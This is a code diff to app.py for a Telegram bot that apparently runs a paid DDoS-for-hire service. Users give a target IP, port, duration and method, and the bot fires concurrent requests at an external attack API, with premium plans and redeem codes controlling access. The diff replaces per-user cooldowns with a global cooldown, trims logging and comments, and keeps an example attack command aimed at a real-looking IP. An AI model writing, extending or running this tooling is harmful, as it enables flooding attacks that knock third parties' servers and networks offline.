@@ -1,4 +1,4 @@
-# app.py - FIXED ATTACK DURATION AND ALL METHODS WORKING
+# app.py - FIXED GLOBAL COOLDOWN AND ALL METHODS WORKING
 import os
 import logging
 import asyncio
@@ -732,7 +732,7 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== ATTACK MANAGER =====
+# ===== ATTACK MANAGER - FIXED GLOBAL COOLDOWN =====
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -748,6 +748,7 @@ class AttackManager:
         self.attack_queue = []
         self.processing_queue = False
         
+        # GLOBAL COOLDOWN - affects ALL users
         self.global_cooldown_active = False
         self.global_cooldown_end = None
         self.last_attack_user = None
@@ -764,11 +765,13 @@ class AttackManager:
     
     def can_start_attack(self, user_id):
         with self.lock:
+            # Check GLOBAL cooldown - affects ALL users
             if self.global_cooldown_active and self.global_cooldown_end:
                 if datetime.now() < self.global_cooldown_end:
                     remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
                     return False, f"🌍 *Global Cooldown Active*\n\nWait {remaining}s before next attack.\nLast attack by: {self.last_attack_user}"
             
+            # Check if attack already running
             if self.global_attack_running:
                 remaining = 0
                 if self.attack_end_time:
@@ -777,23 +780,7 @@ class AttackManager:
                         remaining = 0
                 return False, f"❌ Attack already running!\nUser: {self.current_attacker}\n⏳ Time remaining: {remaining}s"
             
-            last_attack_time = db.get_last_attack_time(user_id)
-            last_duration = db.get_last_attack_duration(user_id)
-            
-            if last_attack_time:
-                if isinstance(last_attack_time, str):
-                    try:
-                        last_attack_time = datetime.fromisoformat(last_attack_time)
-                    except:
-                        last_attack_time = None
-                
-                if last_attack_time and isinstance(last_attack_time, datetime):
-                    cooldown_time = self.get_cooldown_time(last_duration)
-                    elapsed = (datetime.now() - last_attack_time).total_seconds()
-                    if elapsed < cooldown_time:
-                        remaining = int(cooldown_time - elapsed)
-                        return False, f"⏳ User Cooldown: {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown_time}s)"
-            
+            # Check concurrent attacks per user
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
                 return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
@@ -815,6 +802,7 @@ class AttackManager:
             self.current_attack_duration = duration
             self.attack_end_time = datetime.now() + timedelta(seconds=duration + 5)
             
+            # Set GLOBAL cooldown - affects ALL users
             self.global_cooldown_active = True
             cooldown = self.get_cooldown_time(duration)
             self.global_cooldown_end = datetime.now() + timedelta(seconds=cooldown)
@@ -999,7 +987,7 @@ async def send_attack_alert(attack_info):
             f"📊 Plan: {plan.upper()}\n"
             f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
             f"⏱️ Duration: {attack_info['duration']}s\n"
-            f"⏳ Cooldown: {cooldown}s\n"
+            f"⏳ Global Cooldown: {cooldown}s\n"
             f"📡 Method: {attack_info['method'].upper()}\n"
             f"🔄 Concurrent: {attack_info['concurrent']}\n"
             f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
@@ -1019,9 +1007,8 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK - FIXED WITH PROPER DURATION =====
+# ===== API ATTACK =====
 async def send_api_attack(target, port, duration, attack_num, api_key, api_url, method):
-    """Send single API attack request - FIXED"""
     params = {
         "key": api_key,
         "host": target,
@@ -1038,7 +1025,6 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
     }
     
     try:
-        # Set timeout to duration + 10 seconds
         timeout = aiohttp.ClientTimeout(total=duration + 10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
@@ -1049,8 +1035,6 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
                 
                 logger.info(f"Attack {attack_num} ({method}): Status={response.status}, Time={elapsed:.2f}s")
                 
-                # Check if response indicates success
-                # The API returns 200 even if attack is sent successfully
                 if response.status == 200:
                     return {
                         "success": True,
@@ -1095,9 +1079,8 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
             "method": method
         }
 
-# ===== CONCURRENT ATTACKS - FIXED WITH PROPER DURATION =====
+# ===== CONCURRENT ATTACKS =====
 async def send_concurrent_attacks(target, port, duration, user_id, context, method="UDP"):
-    """Send multiple concurrent attacks - FIXED with proper duration handling"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent {method} attacks on {target}:{port} for {duration}s")
     
     api_key = os.getenv("API_KEY")
@@ -1112,7 +1095,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         )
         return None
     
-    # Send initial message
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK STARTING*\n\n"
@@ -1130,7 +1112,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         task = send_api_attack(target, port, duration, i, api_key, api_url, method)
         tasks.append(task)
     
-    # Start timer update task - this will run for the full duration
+    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     
     # Run all tasks concurrently
@@ -1138,7 +1120,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
     results = await asyncio.gather(*tasks, return_exceptions=True)
     elapsed = time.time() - start_time
     
-    # Wait for the timer task to complete (it runs for the full duration)
+    # Wait for timer to complete (it runs for the full duration)
     await timer_task
     
     # Process results
@@ -1159,8 +1141,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
                 error = r.get('error', r.get('response', 'Unknown error'))
                 result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
     
-    cooldown = attack_manager.get_cooldown_time(duration)
-    
     final_text = (
         f"✅ *ATTACK COMPLETE!*\n\n"
         f"🎯 Target: `{target}:{port}`\n"
@@ -1170,8 +1150,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         f"❌ Failed: `{failed_count}/{MAX_CONCURRENT}`\n"
         f"⏱️ Total Time: `{elapsed:.2f}s`\n"
         f"⚡ Status: {'✅ COMPLETED' if success_count > 0 else '❌ FAILED'}\n\n"
-        f"⏳ Global Cooldown: {cooldown}s\n"
-        f"⏳ Next attack in: `{cooldown}s`\n\n"
         f"📊 *Results:*\n" + "\n".join(result_details[:5])
     )
     
@@ -1198,7 +1176,6 @@ async def update_timer(status_msg, duration, target, port, method="UDP"):
         start_time = time.time()
         last_update = 0
         
-        # Run for the full duration
         while True:
             elapsed = time.time() - start_time
             remaining = max(0, int(duration - elapsed))
@@ -1206,8 +1183,7 @@ async def update_timer(status_msg, duration, target, port, method="UDP"):
             if remaining <= 0:
                 break
             
-            # Update every 3 seconds
-            if int(elapsed) % 3 == 0 and int(elapsed) != last_update:
+            if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
                 last_update = int(elapsed)
                 try:
                     await status_msg.edit_text(
@@ -1227,7 +1203,6 @@ async def update_timer(status_msg, duration, target, port, method="UDP"):
             await asyncio.sleep(1)
             
     except asyncio.CancelledError:
-        logger.info(f"Timer cancelled for {target}:{port}")
         pass
     except Exception as e:
         logger.error(f"Timer update error: {e}")
@@ -1573,22 +1548,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if stats['is_running']:
         attack_status = f"\n⚠️ *Attack in progress by another user!*\n⏳ Time remaining: {stats['remaining']}s"
     
-    cooldown_status = ""
-    last_attack_time = db.get_last_attack_time(user_id)
-    last_duration = db.get_last_attack_duration(user_id)
-    if last_attack_time:
-        if isinstance(last_attack_time, str):
-            try:
-                last_attack_time = datetime.fromisoformat(last_attack_time)
-            except:
-                last_attack_time = None
-        if last_attack_time and isinstance(last_attack_time, datetime):
-            cooldown = attack_manager.get_cooldown_time(last_duration)
-            elapsed = (datetime.now() - last_attack_time).total_seconds()
-            if elapsed < cooldown:
-                remaining = int(cooldown - elapsed)
-                cooldown_status = f"\n⏳ *Cooldown:* {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown}s)"
-    
     global_cooldown_status = ""
     if stats['global_cooldown_remaining'] > 0:
         global_cooldown_status = f"\n🌍 *Global Cooldown:* {stats['global_cooldown_remaining']}s remaining"
@@ -1599,10 +1558,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ {MAX_CONCURRENT}x UDP Concurrent: {'✅ ENABLED' if plan == 'premium' else '❌ PREMIUM ONLY'}\n"
-        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}{attack_status}{cooldown_status}{global_cooldown_status}\n\n"
+        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}{attack_status}{global_cooldown_status}\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME METHOD'}\n"
-        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)\n\n"
+        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
         f"📡 *Attack Methods:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS])
     )
     
@@ -1669,8 +1627,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
             f"Example: `/attack 91.108.17.41 32001 60 UDP`\n\n"
             f"⚡ {MAX_CONCURRENT} concurrent attacks!\n"
-            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-            f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)\n\n"
+            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
             f"📡 *Available Methods:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS]),
             parse_mode='Markdown'
         )
@@ -1905,24 +1862,6 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     plan, expiry = db.get_user_plan(user_id)
     
-    last_duration = db.get_last_attack_duration(user_id)
-    last_attack_time = db.get_last_attack_time(user_id)
-    cooldown_info = ""
-    if last_attack_time:
-        if isinstance(last_attack_time, str):
-            try:
-                last_attack_time = datetime.fromisoformat(last_attack_time)
-            except:
-                last_attack_time = None
-        if last_attack_time and isinstance(last_attack_time, datetime):
-            cooldown = attack_manager.get_cooldown_time(last_duration)
-            elapsed = (datetime.now() - last_attack_time).total_seconds()
-            if elapsed < cooldown:
-                remaining = int(cooldown - elapsed)
-                cooldown_info = f"\n⏳ Cooldown: {remaining}s remaining"
-            else:
-                cooldown_info = f"\n✅ Cooldown: Ready"
-    
     if plan == "free":
         text = (
             "👤 *MY PLAN*\n\n"
@@ -1943,9 +1882,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT}x UDP Concurrent\n"
                 "• Multiple attack methods\n"
-                "• Unlimited attacks\n"
-                f"• Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
-                f"{cooldown_info}"
+                "• Unlimited attacks"
             )
         else:
             text = (
@@ -1955,9 +1892,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT}x UDP Concurrent\n"
                 "• Multiple attack methods\n"
-                "• Unlimited attacks\n"
-                f"• Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
-                f"{cooldown_info}"
+                "• Unlimited attacks"
             )
     
     await query.edit_message_text(
@@ -2004,7 +1939,6 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🌍 Global Cooldown: {stats['global_cooldown_remaining']}s\n"
         f"⏳ Queue Size: {stats['queue_size']}\n"
         f"⚡ {MAX_CONCURRENT}x UDP: ENABLED\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
         f"📡 Methods: {len(ATTACK_METHODS)}\n"
         f"🌐 Status: {pause_status}"
     )
@@ -2546,7 +2480,6 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📡 Available: {', '.join(ATTACK_METHODS)}\n"
         f"⚡ Concurrent: {MAX_CONCURRENT}x\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
         f"🌐 Status: {'🟢 ONLINE' if '✅' in message else '🔴 OFFLINE'}"
     )
     
@@ -2854,26 +2787,10 @@ async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAUL
         else:
             expiry_text = "Lifetime" if plan == "PREMIUM" else "No plan"
         
-        last_duration = db.get_last_attack_duration(user_id2)
-        last_attack_time = db.get_last_attack_time(user_id2)
-        cooldown_info = ""
-        if last_attack_time:
-            if isinstance(last_attack_time, str):
-                try:
-                    last_attack_time = datetime.fromisoformat(last_attack_time)
-                except:
-                    last_attack_time = None
-            if last_attack_time and isinstance(last_attack_time, datetime):
-                cooldown = attack_manager.get_cooldown_time(last_duration)
-                elapsed = (datetime.now() - last_attack_time).total_seconds()
-                if elapsed < cooldown:
-                    remaining = int(cooldown - elapsed)
-                    cooldown_info = f" (Cooldown: {remaining}s)"
-        
         is_banned = "🚫" if user.get('is_banned') else "✅"
         is_admin = "⭐" if db.is_admin(user_id2) else ""
         text += f"{is_banned} {is_admin} {user_id2} - @{username}\n"
-        text += f"   📊 {plan} | ⏱️ {expiry_text}{cooldown_info}\n\n"
+        text += f"   📊 {plan} | ⏱️ {expiry_text}\n\n"
     
     if len(users) > 50:
         text += f"... and {len(users) - 50} more users"
@@ -2953,10 +2870,6 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         plan, expiry = db.get_user_plan(user_id)
         logger.info(f"✅ AFTER REDEEM: User {user_id} - Plan: {plan}, Expiry: {expiry}")
         
-        direct_user = db.get_user(user_id)
-        if direct_user:
-            logger.info(f"✅ DIRECT DB CHECK: User {user_id} - Plan: {direct_user.get('plan')}, Expiry: {direct_user.get('plan_expiry')}")
-        
         duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
         expiry_text = "Never" if result['access_days'] >= 3650 else (expiry.strftime('%Y-%m-%d %H:%M') if expiry else "Never")
         
@@ -3003,7 +2916,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🎯 Method: Multiple\n"
         f"⚡ {MAX_CONCURRENT}x Concurrent\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
         f"📡 Methods: {', '.join(ATTACK_METHODS)}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: {pause_status}\n\n"
@@ -3143,7 +3055,6 @@ if __name__ == "__main__":
     print(f"⚡ {MAX_CONCURRENT}x CONCURRENT")
     print("📌 Global Cooldown & Queue System")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
-    print(f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s")
     print("📡 Methods: " + ", ".join(ATTACK_METHODS))
     print("📌 Owner & Pseudo_Owner have equal powers")
     print("📌 Broadcast: Text, Photos, Videos")
